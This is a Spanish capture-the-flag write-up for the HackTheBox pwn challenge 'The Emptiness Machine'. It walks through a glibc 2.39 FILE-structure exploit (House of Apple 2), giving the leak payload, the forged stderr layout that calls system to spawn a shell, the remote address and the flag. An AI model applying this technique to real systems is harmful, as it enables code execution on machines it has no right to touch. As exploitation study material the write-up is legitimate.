# The Emptiness Machine: HackTheBox (Pwn / FSOP)

**Flag:** `HTB{f4ll1ng_4_th3_pr0m1s3_0f_th3_3mptin355_m4ch1ne :)_b0e01c0ba00fbf452a801f9a88e6d3e5}`

Remote: `154.57.164.64:31087` · glibc **2.39** (shipped) · Técnica: **House of Apple 2**

---

## 1. Reconocimiento

Binario diminuto, sin heap ni menú. `main()` hace exactamente:

```c
scanf("%40s",  stdout);   // escribe bytes atacante DENTRO de _IO_2_1_stdout_
printf(prompt2);          // usa el stdout ya corrupto        -> LEAK
scanf("%224s", stderr);   // escribe bytes atacante DENTRO de _IO_2_1_stderr_
return;                   // exit -> _IO_cleanup -> _IO_OVERFLOW(stderr) -> RCE
```

Mitigaciones: `Full RELRO`, `NX`, `PIE`, **sin canary** (irrelevante, no hay stack overflow).

El "bug" es el diseño: `scanf("%s", &FILE)` deja escribir directamente sobre las
estructuras `FILE` de libc. `%s` corta solo con whitespace (`0x09,0x0a,0x0b,0x0c,0x0d,0x20`);
el `NUL` pasa, así que se escriben punteros de 8 bytes completos (con **retry** si el
ASLR mete un byte whitespace en el payload).

## 2. Stage 1: Leak de libc (corromper stdout)

`scanf("%40s", stdout)` escribe 32 bytes en `_IO_2_1_stdout_`:

```
stage1 = p32(0xfbad1800) + b"\x00"*28
```

- `_flags = 0xfbad1800` marca el buffer como "hay que flushear".
- El **NUL terminador** de `scanf` cae sobre el byte bajo de `_IO_write_base`,
  bajándolo `0x43` por debajo de `_IO_write_ptr`.
- El siguiente `printf` flushea el rango `[write_base, write_ptr)` = **punteros de
  libc** que quedaban en la estructura.

```
data  = recv(0x43)
chain = u64(data[0x28:0x30])
libc_base = chain - 0x2038e0     # offset ASLR-invariante calibrado en local
```

## 3. Stage 2: House of Apple 2 (corromper stderr)

`scanf("%224s", stderr)` rellena `stderr[0..0xdf]` exactos (`stderr = stdout - 0xe0`).
Al `return`, el `exit` dispara `_IO_cleanup -> _IO_flush_all -> _IO_OVERFLOW(stderr)`.
Se forja un `FILE` falso para desviar la cadena wide:

```
_IO_wfile_overflow -> _IO_wdoallocbuf -> _wide_vtable->__doallocate(fp) == system(fp)
```

FILE falso `S = libc_base + _IO_2_1_stderr_`:

| offset | valor | rol |
|--------|-------|-----|
| `0x00` | `"\x41\xb0;sh\x00"` | `_flags` **= comando** → `system("A\xb0;sh")` → `sh` |
| `0x08` | `0` | `read_ptr` (= `P->_IO_write_base`, debe ser 0) |
| `0x10` | `system` | `read_end` (= `Q->__doallocate` = system) |
| `0x20` | `0` | `write_base` (= `P->_IO_buf_base`, debe ser 0) |
| `0x28` | `1` | `write_ptr` (> write_base para entrar al flush) |
| `0xa0` | `S-0x10` | `_wide_data = P` |
| `0xc0` | `0` | `_mode = 0` (fuerza rama wide) |
| `0xd0` | `S-0x58` | `P->_wide_vtable = Q` (P+0xe0 == S+0xd0) |
| `0xd8` | `_IO_wfile_jumps` | `vtable` |

Detalles del `_flags`/comando (bytes 0-1 deben cumplir):
- `byte0 & 0x0a == 0` → `_IO_UNBUFFERED`/`_IO_NO_WRITES` limpios.
- `byte1 & 0x08 == 0` → `_IO_CURRENTLY_PUTTING` limpio (toma la rama de alloc).
- `byte1 & 0x80` → `_IO_USER_LOCK (0x8000)` puesto, así `_IO_flush_all` salta el lock
  (este build deref `fp->_lock+8`; un `_lock` NULL/basura crashea).
- `NUL` en offset `0x07` para que `read_ptr` (0x08) siga a 0.

## 4. Disparo y resultado

Al `return` de `main`, sin más input:

```
exit -> _IO_cleanup -> _IO_flush_all -> _IO_OVERFLOW(stderr)
     -> _IO_wfile_overflow -> _IO_wdoallocbuf
     -> Q->__doallocate(fp) = system("A\xb0;sh") -> shell
```

```
[*] chain leak 0x7f10bf3c88e0 -> libc base 0x7f10bf1c5000
uid=100(ctf) gid=101(ctf) groups=101(ctf)
HTB{f4ll1ng_4_th3_pr0m1s3_0f_th3_3mptin355_m4ch1ne :)_b0e01c0ba00fbf452a801f9a88e6d3e5}
```

## 5. Notas de fiabilidad

- El payload de stage 2 contiene punteros de libc dependientes de ASLR. Si alguno
  cae en un byte whitespace, `scanf` lo truncaría → el exploit detecta el byte malo
  y **reintenta** con nuevo ASLR (`retry`). ~1-2 intentos de media.
- Offsets calibrados contra la `libc.so.6` incluida (glibc 2.39); mismos en remoto.

## Ficheros

- `challenge/the_emptiness_machine` + `challenge/glibc/`: binario y libc del reto
- `exploit.py`: exploit pwntools (`./venv/bin/python exploit.py` local · `remote` para el flag)
